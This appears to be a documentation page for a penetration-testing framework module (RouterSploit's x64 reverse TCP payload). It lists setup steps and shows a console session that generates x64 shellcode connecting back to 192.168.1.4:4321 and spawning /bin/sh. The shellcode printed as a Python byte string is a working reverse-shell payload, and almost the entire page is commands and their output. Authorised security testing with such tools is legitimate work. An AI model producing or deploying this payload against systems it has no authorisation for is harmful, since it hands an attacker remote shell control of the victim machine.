## Description

Module generates payload that creates interactive tcp reverse shell for X64 architecture.

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/x64/reverse_tcp`
  3. Do: `set lhost 192.168.1.4`
  4. Do: `set lport 4321`
  5. Module generates x64 reverse shell tcp payload

## Scenarios

```
rsf > use payloads/x64/reverse_tcp
rsf (X64 Reverse TCP) > set lhost 192.168.1.4
[+] lhost => 192.168.1.4
rsf (X64 Reverse TCP) > set lport 4321
[+] lport => 4321
rsf (X64 Reverse TCP) > run
[*] Running module...
[*] Generating payload
[+] Building payload for python
payload = (
    "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
    "\xb9\x02\x00\x10\xe1\xc0\xa8\x01\x04\x51\x48\x89\xe6\x6a\x10"
    "\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
    "\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
    "\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
)
```
